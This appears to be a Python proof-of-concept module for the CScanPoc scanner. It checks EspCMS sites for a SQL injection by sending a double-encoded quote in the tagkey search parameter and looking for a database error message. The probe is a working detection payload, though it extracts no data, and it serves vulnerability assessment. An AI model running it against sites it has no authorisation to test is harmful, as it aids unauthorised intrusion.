# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()


class Vuln(ABVuln):
    vuln_id = 'EspCMS_0011'  # 平台漏洞编号，留空
    name = '易思CMS开源企业网站管理系统SQL注入漏洞'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2013-03-08'  # 漏洞公布时间
    desc = '''
        EspCMS(易思CMS)企业网站管理系统基于LAMP开发构建的企业网站管理系统。
        漏洞主要存在于2个文件：interface/search.php 及 interface/3gwap_search.php 文件里的in_taglist()函数
    '''  # 漏洞描述
    ref = 'http://www.venustech.com.cn/NewsInfo/124/19066.Html'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'EspCMS(易思CMS)'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '19338d8a-27f2-4e07-a763-dd5b741bdb8f'
    author = '国光'  # POC编写者
    create_date = '2018-05-13'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            url = '{target}'.format(target=self.target)
            code, _, res, _, _ = hh.http(
                url + '/index.php?ac=search&at=taglist&tagkey=a%2527')
            if code == 200 and res.find('ESPCMS SQL Error:') != -1:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
